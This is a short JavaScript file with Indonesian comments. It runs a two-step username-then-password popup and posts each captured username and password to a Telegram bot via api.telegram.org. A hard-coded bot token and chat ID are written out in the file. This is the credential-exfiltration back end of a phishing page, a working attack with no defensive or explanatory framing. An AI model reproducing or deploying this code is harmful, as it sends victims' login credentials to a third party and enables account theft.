const botToken = "7595276003:AAH_K5VI6YosFAzu_h6XfNDhZ-qc_pj4wGQ"; // Ganti dengan token bot Telegram Anda
const chatId = "7595276003"; // Ganti dengan ID chat di mana pesan akan dikirim

function nextStep() {
  document.getElementById("popupUsername").style.display = "none";
  document.getElementById("popupPassword").style.display = "block";
}

function submitLogin() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (username && password) {
    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
    sendMessageToTelegram(message);
    alert("Data login dikirim ke bot Telegram.");
  } else {
    alert("Silakan masukkan username dan password.");
  }
}

function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message,
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
  .then(response => response.json())
  .then(data => console.log("Pesan berhasil dikirim ke Telegram"))
  .catch(error => console.error("Error:", error));
}
